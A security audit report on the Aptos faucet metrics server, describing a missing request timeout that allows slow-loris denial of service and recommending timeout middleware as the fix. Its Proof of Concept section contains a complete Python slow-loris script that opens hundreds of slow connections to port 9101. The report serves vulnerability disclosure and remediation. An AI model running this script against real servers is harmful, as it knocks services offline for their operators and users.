# Audit Report

## Title
Missing Request Timeouts in Faucet Metrics Server Enables Slow-Loris DoS Attack

## Summary
The Aptos faucet metrics server does not configure request timeouts, allowing attackers to perform slow-loris attacks by holding connections open indefinitely, leading to resource exhaustion and denial of service on the metrics endpoint.

## Finding Description

The `run_metrics_server()` function in the faucet metrics server creates an HTTP server without any timeout configuration. [1](#0-0) 

The server binds to `0.0.0.0:9101` by default (configurable via `MetricsServerConfig`), making it publicly accessible. [2](#0-1) 

The poem framework's `Server::new()` with `TcpListener::bind()` does not include default request timeouts. Without explicit timeout configuration, an attacker can:

1. Open multiple TCP connections to the metrics server
2. Send partial HTTP requests byte-by-byte at a very slow rate
3. Keep these connections alive indefinitely without completing the request
4. Exhaust server resources (file descriptors, memory, connection pools)
5. Prevent legitimate monitoring requests from being served

This violates the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." While not directly related to blockchain gas, this represents a failure to enforce resource limits on HTTP connections.

The metrics server runs as a separate async task alongside the main faucet API. [3](#0-2) 

## Impact Explanation

This vulnerability represents a **Medium severity** issue under the category of resource exhaustion attacks. While the metrics server is not a core blockchain component, resource exhaustion could:

1. **Degrade monitoring capabilities**: Operators lose visibility into faucet health and performance metrics
2. **Potential resource spillover**: If the metrics server consumes excessive resources (file descriptors, memory), it could impact the main faucet service running on the same process
3. **Operational blind spots**: Inability to detect or diagnose other issues due to metrics unavailability

However, this does NOT directly affect:
- Blockchain consensus operations
- Validator node functionality  
- On-chain funds or transactions
- Core Aptos protocol operations

The faucet is a helper service for funding test accounts, not a critical blockchain component. The impact is primarily operational rather than safety-critical.

## Likelihood Explanation

**Likelihood: High**

The attack is trivial to execute:
- No authentication required on the metrics endpoint
- Default configuration exposes the service on `0.0.0.0` (all network interfaces)
- Standard tools exist for slow-loris attacks (e.g., `slowhttptest`, custom Python scripts)
- Attack requires minimal bandwidth and resources

The barrier to exploitation is extremely low for any network-accessible deployment.

## Recommendation

Add request timeout configuration to the metrics server. The poem framework supports timeout middleware that should be added:

```rust
use poem::middleware::TimeoutLayer;
use std::time::Duration;

pub fn run_metrics_server(
    config: MetricsServerConfig,
) -> impl Future<Output = Result<(), std::io::Error>> {
    let cors = Cors::new().allow_methods(vec![Method::GET]);
    
    // Add request timeout (e.g., 30 seconds)
    let timeout = TimeoutLayer::new(Duration::from_secs(30));
    
    Server::new(TcpListener::bind((
        config.listen_address.clone(),
        config.listen_port,
    )))
    .run(Route::new()
        .at("/metrics", metrics)
        .with(cors)
        .with(timeout))
}
```

Additionally, consider:
1. Adding connection limits to restrict the number of concurrent connections
2. Implementing rate limiting per source IP
3. Configuring keep-alive timeouts at the TCP level
4. Adding the timeout value as a configurable parameter in `MetricsServerConfig`

## Proof of Concept

**Slow-Loris Attack Script (Python):**

```python
#!/usr/bin/env python3
import socket
import time
import threading

TARGET_HOST = "localhost"  # or target faucet metrics server
TARGET_PORT = 9101
NUM_CONNECTIONS = 500
DELAY_BETWEEN_BYTES = 10  # seconds

def slow_attack(conn_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((TARGET_HOST, TARGET_PORT))
        
        # Send partial HTTP request very slowly
        request = b"GET /metrics HTTP/1.1\r\nHost: "
        for byte in request:
            sock.send(bytes([byte]))
            time.sleep(DELAY_BETWEEN_BYTES)
        
        # Keep connection open
        print(f"Connection {conn_id} holding open...")
        while True:
            time.sleep(60)
            
    except Exception as e:
        print(f"Connection {conn_id} failed: {e}")

if __name__ == "__main__":
    print(f"Launching slow-loris attack against {TARGET_HOST}:{TARGET_PORT}")
    print(f"Opening {NUM_CONNECTIONS} slow connections...")
    
    threads = []
    for i in range(NUM_CONNECTIONS):
        t = threading.Thread(target=slow_attack, args=(i,))
        t.start()
        threads.append(t)
        time.sleep(0.1)  # Small delay between connection attempts
    
    print(f"All {NUM_CONNECTIONS} attack threads started")
    for t in threads:
        t.join()
```

**Verification:**

1. Deploy a faucet with default metrics configuration
2. Run the attack script targeting port 9101
3. Observe resource exhaustion (check `lsof` for open file descriptors)
4. Attempt legitimate metrics request: `curl http://localhost:9101/metrics`
5. Request will hang or timeout due to exhausted connection pool

**Expected Result**: The metrics server becomes unresponsive to legitimate requests after attack connections exhaust available resources.

## Notes

- This vulnerability is specific to the **faucet metrics server**, not validator nodes or core blockchain components
- The main faucet API server at `/` and `/fund` endpoints may have similar issues and should be audited separately
- The same pattern appears in the main API runtime without explicit timeouts [4](#0-3) 
- Other Aptos services using poem should be reviewed for timeout configuration

### Citations

**File:** crates/aptos-faucet/metrics-server/src/server.rs (L31-40)
```rust
pub fn run_metrics_server(
    config: MetricsServerConfig,
) -> impl Future<Output = Result<(), std::io::Error>> {
    let cors = Cors::new().allow_methods(vec![Method::GET]);
    Server::new(TcpListener::bind((
        config.listen_address.clone(),
        config.listen_port,
    )))
    .run(Route::new().at("/metrics", metrics).with(cors))
}
```

**File:** crates/aptos-faucet/metrics-server/src/config.rs (L22-32)
```rust
    fn default_disable() -> bool {
        false
    }

    fn default_listen_address() -> String {
        "0.0.0.0".to_string()
    }

    fn default_listen_port() -> u16 {
        9101
    }
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L186-193)
```rust
        // Create a future for the metrics server.
        if !self.metrics_server_config.disable {
            main_futures.push(Box::pin(async move {
                run_metrics_server(self.metrics_server_config.clone())
                    .await
                    .context("Metrics server ended unexpectedly")
            }));
        }
```

**File:** api/src/runtime.rs (L260-264)
```rust
        Server::new_with_acceptor(acceptor)
            .run(route)
            .await
            .map_err(anyhow::Error::msg)
    });
```
